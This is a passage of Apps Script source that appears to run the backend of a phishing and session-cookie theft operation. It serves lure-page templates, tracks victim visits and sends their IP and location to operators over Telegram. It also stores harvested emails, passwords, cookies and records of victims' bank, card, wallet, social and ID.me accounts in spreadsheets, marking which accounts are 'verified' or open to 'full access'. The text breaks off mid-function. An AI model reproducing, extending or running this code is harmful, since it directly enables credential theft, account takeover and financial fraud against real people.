function verifyRedirectVisit(params) {
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const redirectSheet = ss.getSheetByName("redirect");

    if (!redirectSheet) {
      return createJsonResponse({ 
        success: false, 
        error: "Redirect sheet not found" 
      });
    }

    const data = redirectSheet.getDataRange().getValues();
    const headers = data[0];
    const pathsIndex = headers.indexOf("paths");
    const clicksIndex = headers.indexOf("clicks");
    const statusIndex = headers.indexOf("status");
    const linkIndex = headers.indexOf("link");

    const completeUrlHost = getHostFromUrl(params.completeUrl);

    for (let i = 1; i < data.length; i++) {
      const row = data[i];
      if (row[statusIndex] === "ACTIVE") {
        try {
          const paths = JSON.parse(row[pathsIndex] || "[]");
          const matchingPath = paths.find(p => p.path === params.path);

          if (matchingPath) {
            const redirectLinkHost = getHostFromUrl(row[linkIndex]);

            // Only perform strict host match if not localhost
            if (!isLocalHost(completeUrlHost)) {
              if (completeUrlHost !== redirectLinkHost) {
                return createJsonResponse({
                  success: false,
                  error: "Host mismatch for redirect link"
                });
              }
            }

            // Update clicks in paths JSON
            matchingPath.clicks++;
            redirectSheet.getRange(i + 1, pathsIndex + 1).setValue(JSON.stringify(paths));
            
            // Update total clicks
            const currentClicks = row[clicksIndex] || 0;
            redirectSheet.getRange(i + 1, clicksIndex + 1).setValue(currentClicks + 1);

            return createJsonResponse({
              success: true,
              redirectURL: matchingPath.redirectURL,
              status: "active"
            });
          }
        } catch (e) {
          Logger.log("Error parsing paths JSON: " + e);
        }
      }
    }

    return createJsonResponse({
      success: false,
      error: "No active redirect found for the given path"
    });

  } catch (error) {
    Logger.log("Error in verifyRedirectVisit: " + error);
    return createJsonResponse({
      success: false,
      error: "Server error: " + error.toString()
    });
  }
}

function testVerifyPageVisit() {
  const testParams = {
    path: "00ef38976de242c8a613",
    completeUrl: "https://protected-ssl.vercel.app/",
    ipData: "102.129.234.160"
  };
  
  const result = verifyPageVisit(testParams);
  Logger.log(result.getContent());
}

function verifyPageVisit(params) {
  try {
    const ss = SpreadsheetApp.openById(CONFIG.DB_ID);
    const projectsSheet = ss.getSheetByName(CONFIG.SHEET_NAME.PROJECTS);

    if (!projectsSheet) {
      return createJsonResponse({ 
        success: false, 
        error: "Projects sheet not found" 
      });
    }

    const data = projectsSheet.getDataRange().getValues();
    const headers = data[0];
    const mainURLIndex = headers.indexOf("mainURL");
    const urlPathsIndex = headers.indexOf("urlPaths");
    const systemStatusIndex = headers.indexOf("systemStatus");
    const pageVisitsIndex = headers.indexOf("pageVisits");
    const flaggedVisitsIndex = headers.indexOf("flaggedVisits");
    const templateCodeIndex = headers.indexOf("templateCode");
    const telegramGroupIdIndex = headers.indexOf("telegramGroupId");
    const projectNameIndex = headers.indexOf("projectTitle"); // Assuming you have this column
    const notifyVisitsIndex = headers.indexOf("notifyVisits");
    const userIdIndex = headers.indexOf("userId");

    const completeUrlHost = getHostFromUrl(params.completeUrl);

    // Fetch full IP data
    let fullIpData = {};
    if (params.ipData) {
      fullIpData = getIpInfo(params.ipData);
      // If ipinfo.io returns an error or empty, ensure we still have the original IP
      if (!fullIpData || !fullIpData.ip) {
        fullIpData = { ip: params.ipData };
      }
    } else {
      fullIpData = { ip: "Unknown" };
    }

    // First, find the project that matches the path
    let matchingProjectRow = null;
    let matchingProjectIndex = -1;

    for (let i = 1; i < data.length; i++) {
      const row = data[i];
      if (row[systemStatusIndex] === "ACTIVE") {
        try {
          const urlPathsValue = row[urlPathsIndex];
          Logger.log(`Row ${i}: urlPaths value = "${urlPathsValue}", type = ${typeof urlPathsValue}`);
          
          // Handle empty, null, or undefined values
          let urlPathsString = urlPathsValue;
          if (!urlPathsString || urlPathsString.trim() === "") {
            urlPathsString = "[]";
          }
          
          const urlPaths = JSON.parse(urlPathsString);
          const matchingPath = urlPaths.find(p => p.path === params.path);

          if (matchingPath) {
            matchingProjectRow = row;
            matchingProjectIndex = i;
            break; // Found the matching project, exit loop
          }
        } catch (e) {
          Logger.log(`Error parsing urlPaths JSON for row ${i}: ${e}`);
          Logger.log(`Raw value: "${row[urlPathsIndex]}"`);
          // Continue to next row instead of failing
          continue;
        }
      }
    }

    // If we found a matching project by path, process it
    if (matchingProjectRow) {
      const mainURL = matchingProjectRow[mainURLIndex];
      const mainUrlHost = getHostFromUrl(mainURL);
      const telegramGroupId = matchingProjectRow[telegramGroupIdIndex];
      const projectName = matchingProjectRow[projectNameIndex] || "Unknown Project";

      if (!isLocalHost(completeUrlHost)) {
        if (completeUrlHost !== mainUrlHost) {
          // Host mismatch, count as flagged and send notification
          const currentFlagged = parseInt(matchingProjectRow[flaggedVisitsIndex] || 0);
          projectsSheet.getRange(matchingProjectIndex + 1, flaggedVisitsIndex + 1).setValue(currentFlagged + 1);

          // Send flagged visit notification only if notifyVisits is TRUE
          const notifyVisits = String(matchingProjectRow[notifyVisitsIndex]).trim().toUpperCase() === "TRUE";
          Logger.log("notifyVisits (flagged): " + notifyVisits); // Added logging
          if (telegramGroupId && notifyVisits) {
            sendVisitorNotification(telegramGroupId, fullIpData, projectName, params.path, params.completeUrl, "FLAGGED");
          }

          return createJsonResponse({
            success: false,
            error: "Host mismatch with mainURL"
          });
        }
      }

      // Host matches (or localhost), count as valid visit and send notification
      const currentVisits = parseInt(matchingProjectRow[pageVisitsIndex] || 0);
      projectsSheet.getRange(matchingProjectIndex + 1, pageVisitsIndex + 1).setValue(currentVisits + 1);

      // Send valid visit notification only if notifyVisits is TRUE
      const notifyVisits = String(matchingProjectRow[notifyVisitsIndex]).trim().toUpperCase() === "TRUE";
      Logger.log("notifyVisits (valid): " + notifyVisits); // Added logging
      if (telegramGroupId && notifyVisits) {
        sendVisitorNotification(telegramGroupId, fullIpData, projectName, params.path, params.completeUrl, "VALID");
      }

      return createJsonResponse({
        success: true,
        templateCode: matchingProjectRow[templateCodeIndex],
        // Project owner — the pagetemplate backend injects this into any
        // verify-login URL inside templateCode (required by the engine).
        userId: userIdIndex !== -1 ? String(matchingProjectRow[userIdIndex] || "").trim() : "",
        status: "active",
        ipData: fullIpData
      });
    }

    // If no matching path found, increase flaggedVisits for all active projects (but no notifications)
    for (let i = 1; i < data.length; i++) {
      const row = data[i];
      if (row[systemStatusIndex] === "ACTIVE") {
        const currentFlagged = parseInt(row[flaggedVisitsIndex] || 0);
        projectsSheet.getRange(i + 1, flaggedVisitsIndex + 1).setValue(currentFlagged + 1);
      }
    }

    return createJsonResponse({
      success: false,
      error: "No active project matched the path"
    });

  } catch (error) {
    Logger.log("Error in verifyPageVisit: " + error);
    return createJsonResponse({
      success: false,
      error: "Server error: " + error.toString()
    });
  }
}

function sendVisitorNotification(telegramGroupId, ipData, projectName, path, completeUrl, visitType) {
  try {
    // Parse ipData if it's a string
    let visitorInfo = ipData || {};

    // Extract visitor information with fallbacks
    const ip = visitorInfo.ip || visitorInfo.query || "Unknown IP";
    const country = visitorInfo.country || "Unknown";
    const region = visitorInfo.regionName || visitorInfo.region || "Unknown";
    const city = visitorInfo.city || "Unknown";
    const isp = visitorInfo.isp || visitorInfo.org || "Unknown ISP";
    const timezone = visitorInfo.timezone || "Unknown";
    
    // Get current timestamp
    const timestamp = new Date().toLocaleString('en-US', {
      timeZone: timezone !== "Unknown" ? timezone : 'UTC',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    });

    // Construct the simplified message (only Valid Visit format)
    const formattedMessage = `✅ **Valid Visit**
    🌐 **Project:** ${projectName}
    👤 **Visitor Details:**
    🌍 **Location:** ${city}, ${region}, ${country}
    🌐 **IP Address:** ${ip}
    🏢 **ISP:** ${isp}
    🕒 **Time:** ${timestamp}
    🌏 **Timezone:** ${timezone}`;

    const textPayload = {
      method: "sendMessage",
      chat_id: telegramGroupId,
      text: formattedMessage,
      parse_mode: "Markdown"
    };

    const messageId = sendMediaAndMessageToTelegram(textPayload, null, getSettingValue("webFixxTelegramBot"));

    if (messageId) {
      Logger.log(`Telegram notification sent successfully for visit to ${projectName}`);
    } else {
      Logger.log(`Failed to send Telegram notification for visit to ${projectName}`);
    }

  } catch (error) {
    Logger.log("Error sending visitor notification: " + error);
  }
}

function getIpInfo(ipAddress) {
  if (!ipAddress) {
    return {};
  }
  try {
    const url = `https://ipinfo.io/${ipAddress}/json`;
    const response = UrlFetchApp.fetch(url);
    const json = response.getContentText();
    return JSON.parse(json);
  } catch (e) {
    Logger.log(`Error fetching IP info for ${ipAddress}: ${e}`);
    return { ip: ipAddress, error: e.toString() }; // Return original IP and error
  }
}

function getHostFromUrl(url) {
  if (!url) {
    return "";
  }
  try {
    // Remove protocol (http://, https://)
    let host = url.replace(/^(https?:\/\/)?(www\.)?/i, '');
    // Remove path, query, and hash
    host = host.split('/')[0];
    host = host.split('?')[0];
    host = host.split('#')[0];
    // Remove port if present
    host = host.split(':')[0];
    return host;
  } catch (e) {
    Logger.log("Error extracting host from URL: " + url + " - " + e);
    return "";
  }
}

function isLocalHost(host) {
  return (
    host.startsWith("localhost") ||
    host.startsWith("127.") ||
    host.startsWith("0.") ||
    host === "0.0.0.0"
  );
}


function getCookieData(params) {
  try {
    const result = getAllRows("cookie");
    Logger.log(result);
    if (!result.success) return createJsonResponse(result);

    return createJsonResponse({
      success: true,
      headers: result.headers,
      data: result.data,
      count: result.count
    });
  } catch (error) {
    Logger.log("Error in getCookieData: " + error.message);
    return createJsonResponse({
      success: false,
      error: error.message
    });
  }
}

function setCookieData(params) {
  try {
    const { browserId, newRow = false, status } = params;
    if (!browserId) {
      return createJsonResponse({
        success: false,
        error: "Missing browserId"
      });
    }

    // Exclude keys that should not be updated/inserted. 'id'/'end' are auto-populated
    // by sheet formulas — writing them would destroy the formula.
    const excludedKeys = ["action", "browserId", "newRow", "id", "end"];
    const processedData = {};

    Object.keys(params).forEach(key => {
      if (!excludedKeys.includes(key)) {
        processedData[key] = params[key];
      }
    });

    let result;
    if (newRow) {
      // For new rows, use setRowDataByHeaderMap
      result = setRowDataByHeaderMap(CONFIG.SHEET_NAME.COOKIE, {
        browserId,
        ...processedData,
        timestamp: new Date().toISOString() // Add timestamp for new rows
      });

      if (!result.success) {
        return createJsonResponse({
          success: false,
          error: "Failed to create new row",
          details: result
        });
      }
    } else {
      // For existing rows, use setMultipleCellDataByColumnSearch
      result = setMultipleCellDataByColumnSearch(CONFIG.SHEET_NAME.COOKIE, "browserId", browserId, processedData);

      if (!result.success) {
        return createJsonResponse({
          success: false,
          error: "Failed to update existing row",
          details: result
        });
      }

      // Schedule updateHubAndProjectsFromCookieData if status is COMPLETED or FAILED
      if (result.success && (status === "COMPLETED" || status === "FAILED")) {
        try {
          const triggerId = Utilities.getUuid();
          const triggerProperties = {
            browserId: browserId,
            status: status
          };
          PropertiesService.getScriptProperties().setProperty(triggerId, JSON.stringify(triggerProperties));

          ScriptApp.newTrigger('runUpdateHubAndProjectsFromCookieDataWrapper')
            .timeBased()
            .at(new Date(Date.now() + 2 * 1000)) // Run 2 seconds from now
            .create();
          Logger.log(`Scheduled updateHubAndProjectsFromCookieData for browserId: ${browserId}, status: ${status}`);
        } catch (e) {
          Logger.log("Error scheduling updateHubAndProjectsFromCookieData: " + e.message);
        }
      }
    }

    return createJsonResponse({
      success: true,
      message: newRow ? "New cookie data row created successfully" : "Cookie data updated successfully",
      rowNumber: result.rowId
    });
  } catch (error) {
    Logger.log("Error in setCookieData: " + error.message);
    return createJsonResponse({
      success: false,
      error: error.message
    });
  }
}

/**
 * Helper function to update hub and projects sheets with data from the cookie sheet.
 * This function is intended to be called when a cookie submission status changes (e.g., COMPLETED, FAILED).
 * @param {string} browserId - The browserId to identify the cookie row and corresponding submissions.
 * @param {string} status - The status of the cookie submission (e.g., "COMPLETED", "FAILED").
 * @returns {Object} A JSON response indicating success or failure.
 */
function updateHubAndProjectsFromCookieData(browserId, status) {
  Logger.log(`updateHubAndProjectsFromCookieData called for browserId: ${browserId}, status: ${status}`);

  try {
    // 1. Get cookie row data
    const cookieRowsResult = getRowsByColumn(CONFIG.SHEET_NAME.COOKIE, "browserId", browserId);

    if (!cookieRowsResult.success || cookieRowsResult.count === 0) {
      return createJsonResponse({
        success: false,
        error: `Cookie data for browserId '${browserId}' not found.`
      });
    }

    const cookieHeaders = cookieRowsResult.headers;
    const cookieRowData = cookieRowsResult.data[0];
    const cookieRowMap = {};
    cookieHeaders.forEach((header, index) => {
      cookieRowMap[header] = cookieRowData[index];
    });

    // Prepare data for Hub and Projects
    const dataToUpdate = {
      verified: String(cookieRowMap.verified).toLowerCase() === 'true',
      fullAccess: String(cookieRowMap.fullAccess).toLowerCase() === 'true',
      cookieAccess: String(cookieRowMap.cookieAccess).toLowerCase() === 'true', // Add cookieAccess from cookieRowMap
      banks: cookieRowMap.banks || [],
      cards: cookieRowMap.cards || [],
      socials: cookieRowMap.socials || [],
      wallets: cookieRowMap.wallets || [],
      idMe: cookieRowMap.idMe || null,
      cookieJSON: cookieRowMap.cookieJSON || cookieRowMap.formattedCookie || {}, // Map from cookieJSON column (or formattedCookie fallback)
      cookieFileURL: cookieRowMap.cookieFileURL || cookieRowMap.driveUrl || ""      // Map from cookieFileURL column (or driveUrl fallback)
    };

    const projectId = cookieRowMap.projectId;
    if (!projectId) {
      return createJsonResponse({
        success: false,
        error: `projectId not found in cookie data for browserId '${browserId}'.`
      });
    }

    // Resolve templateType from the project row so cookieAccess reflects the project
    // type regardless of the browser automation outcome (matches notifyFormSubmission).
    const projectForTemplateResult = getRowsByColumn(CONFIG.SHEET_NAME.PROJECTS, "projectId", projectId);
    const templateType = (projectForTemplateResult.success && projectForTemplateResult.count > 0)
      ? (projectForTemplateResult.data[0][projectForTemplateResult.headers.indexOf("templateType")] || "UNKNOWN")
      : "UNKNOWN";

    // 2. Update Hub Sheet (first)
    const hubUpdateData = {
      verified: dataToUpdate.verified ? "TRUE" : "FALSE",
      fullAccess: dataToUpdate.fullAccess ? "TRUE" : "FALSE",
      cookieAccess: (templateType === "COOKIE") ? "TRUE" : "FALSE",
      banks: JSON.stringify(dataToUpdate.banks),
      cards: JSON.stringify(dataToUpdate.cards),
      socials: JSON.stringify(dataToUpdate.socials),
      wallets: JSON.stringify(dataToUpdate.wallets),
      // idMe: dataToUpdate.idMe, // Assuming idMe is not directly in hub sheet, or needs specific handling
      cookieJSON: JSON.stringify(dataToUpdate.cookieJSON),
      cookieFileURL: dataToUpdate.cookieFileURL,
      // Add status if there's a status column in hub
      // status: status // If a 'status' column exists in hub
    };

    const updateHubResult = setMultipleCellDataByColumnSearch(
      CONFIG.SHEET_NAME.HUB,
      "submissionId", // Search column in hub is submissionId
      browserId,      // browserId from cookie sheet matches submissionId in hub
      hubUpdateData
    );

    if (!updateHubResult.success) {
      return createJsonResponse({
        success: false,
        error: `Failed to update hub sheet for browserId '${browserId}': ${updateHubResult.error}`
      });
    }
    Logger.log(`Hub sheet updated successfully for browserId: ${browserId}`);

    // 3. Update Projects Sheet
    const projectRowsResult = getRowsByColumn(CONFIG.SHEET_NAME.PROJECTS, "projectId", projectId);

    if (!projectRowsResult.success || projectRowsResult.count === 0) {
      return createJsonResponse({
        success: false,
        error: `Project with projectId '${projectId}' not found for updating response.`
      });
    }

    const projectHeaders = projectRowsResult.headers;
    const projectRowData = projectRowsResult.data[0]; // Assuming projectId is unique
    const projectRowMapForUpdate = {};
    projectHeaders.forEach((header, index) => {
      projectRowMapForUpdate[header] = projectRowData[index];
    });

    let existingResponses = [];
    const responseColumnValue = projectRowMapForUpdate.response;
    if (responseColumnValue) {
      try {
        let parsedResponse = JSON.parse(responseColumnValue);
        if (parsedResponse && parsedResponse.fileId) { // Check for the file pointer
          Logger.log(`Found fileId ${parsedResponse.fileId} in projects sheet, fetching from Drive.`);
          const fileContentResult = getJsonContentFromFile(parsedResponse.fileId);
          if (fileContentResult.success) {
            existingResponses = fileContentResult.data;
          } else {
            Logger.log(`Error fetching responses from Drive: ${fileContentResult.error}`);
            existingResponses = []; // Start fresh if file is corrupt or inaccessible
          }
        } else if (Array.isArray(parsedResponse)) {
          existingResponses = parsedResponse;
        } else {
          existingResponses = [];
        }
      } catch (e) {
        Logger.log("Error parsing existing project response JSON from sheet: " + e.message);
        existingResponses = [];
      }
    }

    let submissionEntryFound = false;
    const updatedResponses = existingResponses.map(entry => {
      if (entry.submissionId === browserId) {
        submissionEntryFound = true;
        return {
          ...entry,
          verified: dataToUpdate.verified,
          fullAccess: dataToUpdate.fullAccess,
          banks: dataToUpdate.banks,
          cards: dataToUpdate.cards,
          socials: dataToUpdate.socials,
          wallets: dataToUpdate.wallets,
          idMe: dataToUpdate.idMe,
          cookieJSON: dataToUpdate.cookieJSON,
          cookieFileURL: dataToUpdate.cookieFileURL
        };
      }
      return entry;
    });

    if (!submissionEntryFound) {
      Logger.log(`Submission entry with browserId '${browserId}' not found in project response JSON for projectId '${projectId}'. Creating a new entry.`);
      // Create a new entry and add it to updatedResponses
      updatedResponses.push({
        id: Utilities.getUuid(), // Generate a new unique ID for this entry
        submissionId: browserId,
        category: cookieRowMap.category || "UNKNOWN", // Assuming category is in cookieRowMap
        type: cookieRowMap.type || "UNKNOWN",         // Assuming type is in cookieRowMap
        title: cookieRowMap.title || "Form Submission", // Assuming title is in cookieRowMap
        userId: cookieRowMap.userId || "",
        projectId: projectId,
        formId: cookieRowMap.formId || "",
        timestamp: normalizeIsoTimestamp(),
        email: cookieRowMap.email || "",
        domain: cookieRowMap.domain || "",
        password: cookieRowMap.password || "",
        ipData: cookieRowMap.ipData || {},
        deviceData: cookieRowMap.deviceData || {},
        verifyAccess: dataToUpdate.verified,
        cookieAccess: (templateType === "COOKIE"), // Set cookieAccess based on templateType regardless of automation outcome
        verified: dataToUpdate.verified,
        fullAccess: dataToUpdate.fullAccess,
        cookieJSON: dataToUpdate.cookieJSON,
        cookieFileURL: dataToUpdate.cookieFileURL,
        banks: dataToUpdate.banks,
        cards: dataToUpdate.cards,
        socials: dataToUpdate.socials,
        wallets: dataToUpdate.wallets,
        apiResponse: cookieRowMap.apiResponse || null // Assuming apiResponse is in cookieRowMap
      });
    }

    const responseStringForUpdate = JSON.stringify(updatedResponses);
    let responseDataToWriteForUpdate;

    // Define a threshold, e.g., 45000 chars, to decide whether to save to Drive
    const CELL_SIZE_LIMIT = 45000; 

    if (responseStringForUpdate.length > CELL_SIZE_LIMIT) {
      Logger.log(`Response size (${responseStringForUpdate.length}) exceeds limit in updateHubAndProjectsFromCookieData. Saving to Drive.`);
      
      // Retrieve the user's folderId from the 'user' sheet using projectRowMapForUpdate.userId
      const userId = projectRowMapForUpdate.userId;
      if (!userId) {
        return createJsonResponse({ success: false, error: "User ID not found in project data for update." });
      }

      const userFolderResult = getOrCreateUserFolder(userId, CONFIG.FOLDER_ID.USERS);
      if (!userFolderResult.success) {
        return createJsonResponse({ success: false, error: `Failed to get or create user folder for userId ${userId} during update: ${userFolderResult.error}` });
      }
      const parentFolderId = userFolderResult.folderId;

      if (!parentFolderId) {
        return createJsonResponse({ success: false, error: "User's parent folderId not found after creation/retrieval during update." });
      }
      
      const fileName = `${projectId}.json`; // Use projectId as the file name
      
      const saveFileResult = createOrUpdateJsonFile(parentFolderId, projectId, fileName, updatedResponses);

      if (saveFileResult.success) {
        responseDataToWriteForUpdate = JSON.stringify({ fileId: saveFileResult.fileId, count: updatedResponses.length });
      } else {
        return createJsonResponse({ success: false, error: `Failed to save updated responses to Drive: ${saveFileResult.error}` });
      }
    } else {
      responseDataToWriteForUpdate = responseStringForUpdate;
    }

    const updateProjectResult = setMultipleCellDataByColumnSearch(
      CONFIG.SHEET_NAME.PROJECTS,
      "projectId",
      projectId,
      { "response": responseDataToWriteForUpdate }
    );

    if (!updateProjectResult.success) {
      return createJsonResponse({
        success: false,
        error: `Failed to update project sheet response for projectId '${projectId}': ${updateProjectResult.error}`
      });
    }
    Logger.log(`Projects sheet response updated successfully for projectId: ${projectId}`);
    invalidateProjectResponse(projectId);

    return createJsonResponse({
      success: true,
      message: `Hub and Projects sheets updated successfully for browserId: ${browserId}`,
      hubUpdate: updateHubResult,
      projectUpdate: updateProjectResult
    });

  } catch (error) {
    Logger.log("Error in updateHubAndProjectsFromCookieData: " + error.message);
    return createJsonResponse({
      success: false,
      error: "Server error in updateHubAndProjectsFromCookieData: " + error.message,
      stack: error.stack
    });
  }
}

function runUpdateHubAndProjectsFromCookieDataWrapper() {
  const scriptProperties = PropertiesService.getScriptProperties();
  const allProperties = scriptProperties.getProperties();

  let triggerIdFound = null;
  for (const key in allProperties) {
    try {
      const properties = JSON.parse(allProperties[key]);
      if (properties.browserId && properties.status) {
        triggerIdFound = key;
        break;
      }
    } catch (e) {
      continue;
    }
  }

  if (triggerIdFound) {
    const propertiesString = scriptProperties.getProperty(triggerIdFound);
    scriptProperties.deleteProperty(triggerIdFound);

    try {
      const { browserId, status } = JSON.parse(propertiesString);
      Logger.log(`Wrapper: Retrieved browserId: ${browserId}, status: ${status}`);
      updateHubAndProjectsFromCookieData(browserId, status);
    } catch (e) {
      Logger.log("Wrapper Error parsing properties or calling updateHubAndProjectsFromCookieData: " + e.message);
    }
  } else {
    Logger.log("Wrapper: No trigger properties found for updateHubAndProjectsFromCookieDataWrapper.");
  }

  const triggers = ScriptApp.getProjectTriggers();
  for (let i = 0; i < triggers.length; i++) {
    if (triggers[i].getHandlerFunction() === 'runUpdateHubAndProjectsFromCookieDataWrapper') {
      ScriptApp.deleteTrigger(triggers[i]);
    }
  }
}

function cleanupFailedRowsAppScript() {
  Logger.log("Starting cleanupFailedRowsAppScript...");
  try {
    const cookieSheetResult = getAllRows(CONFIG.SHEET_NAME.COOKIE);
    if (!cookieSheetResult.success) {
      Logger.log(`Error in cleanupFailedRowsAppScript: ${cookieSheetResult.error}`);
      return createJsonResponse(cookieSheetResult);
    }

    const headers = cookieSheetResult.headers;
    const rows = cookieSheetResult.data; // Data rows, 0-indexed relative to data

    const browserIdIndex = getColumnIndexes(headers)['browserId'];
    const statusIndex = getColumnIndexes(headers)['status'];
    const emailIndex = getColumnIndexes(headers)['email'];
    const projectIdIndex = getColumnIndexes(headers)['projectId']; // Also need projectId for projects update

    if (browserIdIndex === undefined || statusIndex === undefined || emailIndex === undefined || projectIdIndex === undefined) {
      const missingHeaders = [];
      if (browserIdIndex === undefined) missingHeaders.push('browserId');
      if (statusIndex === undefined) missingHeaders.push('status');
      if (emailIndex === undefined) missingHeaders.push('email');
      if (projectIdIndex === undefined) missingHeaders.push('projectId');
      Logger.log(`Missing required headers for cleanup: ${missingHeaders.join(', ')}`);
      return createJsonResponse({ success: false, error: `Missing required headers for cleanup: ${missingHeaders.join(', ')}` });
    }

    // Filter rows based on criteria: status === 'FAILED' AND email is empty
    const rowsToDelete = []; // Store { browserId, projectId, actualSheetRowNumber } for deletion
    for (let i = 0; i < rows.length; i++) {
        const row = rows[i];
        const rowStatus = String(row[statusIndex] || '').trim();
        const rowEmail = String(row[emailIndex] || '').trim();

        if (rowStatus === 'FAILED' && rowEmail === '') {
            rowsToDelete.push({
                browserId: row[browserIdIndex],
                projectId: row[projectIdIndex],
                actualSheetRowNumber: i + 2 // +1 for 0-based data index to 1-based, +1 for header row
            });
        }
    }

    Logger.log(`Found ${rowsToDelete.length} FAILED rows with empty email for deletion.`);

    const ss = SpreadsheetApp.openById(CONFIG.DB_ID);
    const cookieSheet = ss.getSheetByName(CONFIG.SHEET_NAME.COOKIE);
    const hubSheet = ss.getSheetByName(CONFIG.SHEET_NAME.HUB);
    const projectSheet = ss.getSheetByName(CONFIG.SHEET_NAME.PROJECTS);

    if (!cookieSheet || !hubSheet || !projectSheet) {
      Logger.log("One or more required sheets not found for cleanup.");
      return createJsonResponse({ success: false, error: "One or more required sheets not found." });
    }

    // Store GIDs (Sheet IDs) for batchUpdate requests (not needed for these operations)
    const cookieSheetId = cookieSheet.getSheetId();
    const hubSheetId = hubSheet.getSheetId();

    // Collect all project update tasks (since updateJSON can be complex)
    const projectUpdateTasks = []; // To hold { projectId, dataToUpdate } for projects sheet

    // Process deletions in reverse order of row numbers to avoid index shifting issues
    // We sort the rowsToDelete by actualSheetRowNumber in descending order
    rowsToDelete.sort((a, b) => b.actualSheetRowNumber - a.actualSheetRowNumber);

    for (const rowInfo of rowsToDelete) {
        const { browserId, projectId, actualSheetRowNumber } = rowInfo;

        Logger.log(`Processing deletion for browserId: ${browserId}, cookie sheet row: ${actualSheetRowNumber}`);

        // 1. Delete from 'cookie' sheet using helper
        const deleteCookieResult = deleteSheetRow(CONFIG.SHEET_NAME.COOKIE, "browserId", browserId);
        if (deleteCookieResult.success) {
            Logger.log(`Deleted from cookie sheet for browserId: ${browserId}`);
        } else {
            Logger.log(`Failed to delete from cookie sheet for browserId: ${browserId}, error: ${deleteCookieResult.error}`);
        }

        // 2. Delete from 'hub' sheet if exists using helper
        const hubRowsResult = getRowsByColumn(CONFIG.SHEET_NAME.HUB, "submissionId", browserId);
        if (hubRowsResult.success && hubRowsResult.count > 0) {
            const deleteHubResult = deleteSheetRow(CONFIG.SHEET_NAME.HUB, "submissionId", browserId);
            if (deleteHubResult.success) {
                Logger.log(`Deleted from hub sheet for browserId: ${browserId}`);
            } else {
                Logger.log(`Failed to delete from hub sheet for browserId: ${browserId}, error: ${deleteHubResult.error}`);
            }
        } else {
            Logger.log(`No hub row found for browserId ${browserId} for deletion.`);
        }

        // 3. Update 'projects' sheet response (remove entry for browserId)
        if (projectId) {
            const projectRowsResult = getRowsByColumn(CONFIG.SHEET_NAME.PROJECTS, "projectId", projectId);
            if (projectRowsResult.success && projectRowsResult.count > 0) {
                const projectRow = projectRowsResult.data[0]; // Assuming unique projectId
                const projectHeaders = projectRowsResult.headers;
                const responseIndex = getColumnIndexes(projectHeaders)['response'];
                
                let responseValue = projectRow[responseIndex];
                if (responseValue) {
                    try {
                        let parsedResponses = JSON.parse(responseValue);
                        if (parsedResponses && parsedResponses.fileId) {
                            Logger.log(`Fetching project responses from Drive file: ${parsedResponses.fileId}`);
                            const fileContentResult = getJsonContentFromFile(parsedResponses.fileId);
                            if (fileContentResult.success) {
                                parsedResponses = fileContentResult.data;
                            } else {
                                Logger.log(`Error fetching project responses from Drive for ${projectId}: ${fileContentResult.error}`);
                                parsedResponses = [];
                            }
                        }

                        if (Array.isArray(parsedResponses)) {
                            const updatedProjectResponses = parsedResponses.filter(entry => entry.submissionId !== browserId);
                            const newResponseString = JSON.stringify(updatedProjectResponses);

                            let responseDataToWrite;
                            const CELL_SIZE_LIMIT = 45000;
                            if (newResponseString.length > CELL_SIZE_LIMIT) {
                                Logger.log(`Updated project response for ${projectId} exceeds cell limit. Saving to Drive.`);
                                const userId = projectRow[getColumnIndexes(projectHeaders)['userId']]; // Assuming userId exists
                                const userFolderResult = getOrCreateUserFolder(userId, CONFIG.FOLDER_ID.USERS);
                                if (!userFolderResult.success) {
                                    Logger.log(`Failed to get/create user folder for ${userId}: ${userFolderResult.error}`);
                                    continue;
                                }
                                const parentFolderId = userFolderResult.folderId;
                                if (!parentFolderId) {
                                    Logger.log(`User folder ID not found for ${userId}.`);
                                    continue;
                                }
                                const fileName = `${projectId}.json`;
                                const saveFileResult = createOrUpdateJsonFile(parentFolderId, projectId, fileName, updatedProjectResponses);
                                if (saveFileResult.success) {
                                    responseDataToWrite = JSON.stringify({ fileId: saveFileResult.fileId, count: updatedProjectResponses.length });
                                } else {
                                    Logger.log(`Failed to save updated project responses to Drive: ${saveFileResult.error}`);
                                    continue;
                                }
                            } else {
                                responseDataToWrite = newResponseString;
                            }
                            
                            projectUpdateTasks.push({
                                projectId: projectId,
                                data: { "response": responseDataToWrite }
                            });

                        }
                    } catch (e) {
                        Logger.log(`Error parsing/updating projects response for ${projectId}: ${e.message}`);
                    }
                }
            }
        }
    }

    // Execute all project response updates
    for (const task of projectUpdateTasks) {
        setMultipleCellDataByColumnSearch(CONFIG.SHEET_NAME.PROJECTS, "projectId", task.projectId, task.data);
        invalidateProjectResponse(task.projectId);
        Logger.log(`Updated projects response for projectId: ${task.projectId}.`);
    }
    Logger.log(`Executed ${projectUpdateTasks.length} project response updates.`);

    Logger.log("cleanupFailedRowsAppScript completed successfully.");
    return createJsonResponse({ success: true, message: "Cleanup completed successfully." });
  } catch (e) {
    Logger.log(`Global error in cleanupFailedRowsAppScript: ${e.message}`);
    return createJsonResponse({ success: false, error: `Global error in cleanupFailedRowsAppScript: ${e.message}` });
  }
}

// Add a wrapper to execute cleanupFailedRowsAppScript via trigger if needed
function runCleanupFailedRowsWrapper() {
  const scriptProperties = PropertiesService.getScriptProperties();
  const allProperties = scriptProperties.getProperties();

  let triggerIdFound = null;
  for (const key in allProperties) {
    try {
      const properties = JSON.parse(allProperties[key]);
      if (properties.action === "cleanupFailedRows") {
        triggerIdFound = key;
        break;
      }
    } catch (e) {
      continue;
    }
  }

  if (triggerIdFound) {
    scriptProperties.deleteProperty(triggerIdFound); // Clean up the property
    cleanupFailedRowsAppScript(); // Execute the cleanup function
  } else {
    Logger.log("Wrapper: No cleanup trigger properties found.");
  }

  // Delete all triggers for this function to prevent multiple executions
  const triggers = ScriptApp.getProjectTriggers();
  for (let i = 0; i < triggers.length; i++) {
    if (triggers[i].getHandlerFunction() === 'runCleanupFailedRowsWrapper') {
      ScriptApp.deleteTrigger(triggers[i]);
    }
  }
}



/**
 * Scan all cookie rows and mark stale ones as FAILED.
 * Called periodically from TRIGGERS.js to catch rows the engine missed.
 */
function scanAndMarkStaleRowsAppScript() {
  Logger.log("Starting scanAndMarkStaleRowsAppScript...");
  try {
    const cookieSheetResult = getAllRows(CONFIG.SHEET_NAME.COOKIE);
    if (!cookieSheetResult.success) {
